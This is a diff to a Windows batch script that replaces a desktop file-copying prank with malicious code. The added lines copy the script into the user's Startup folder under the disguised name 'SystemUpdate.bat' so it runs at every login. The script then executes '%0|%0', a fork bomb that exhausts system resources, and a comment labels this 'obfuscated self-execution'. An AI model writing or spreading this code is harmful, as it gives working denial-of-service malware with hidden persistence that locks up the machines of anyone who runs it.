@@ -1,21 +1,13 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
-:: Set the source file path
-set "sourceFile=C:\Users\Boudy\Documents\i love u.txt"
+:: Get Startup folder path
+for /f "delims=" %%a in ('powershell -C "$env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\'"') do set "startup=%%a"
 
-:: Set the number of copies
-set "copies=80"
+:: Copy itself to the Startup folder with a hidden name
+set "hiddenName=SystemUpdate.bat"
+copy "%~f0" "!startup!\!hiddenName!" >nul
 
-:: Get the desktop path
-for /f "delims=" %%D in ('powershell -command "[System.Environment]::GetFolderPath('Desktop')"') do set "desktopPath=%%D"
-
-:: Extract the filename and extension separately
-for %%F in ("%sourceFile%") do set "fileName=%%~nF" & set "fileExt=%%~xF"
-
-:: Loop to copy the file multiple times
-for /l %%i in (1,1,%copies%) do (
-    copy "%sourceFile%" "%desktopPath%\%fileName% (%%i)%fileExt%"
-)
-
-
+:: Obfuscated self-execution
+set "cmd=%0^|%0"
+!cmd!
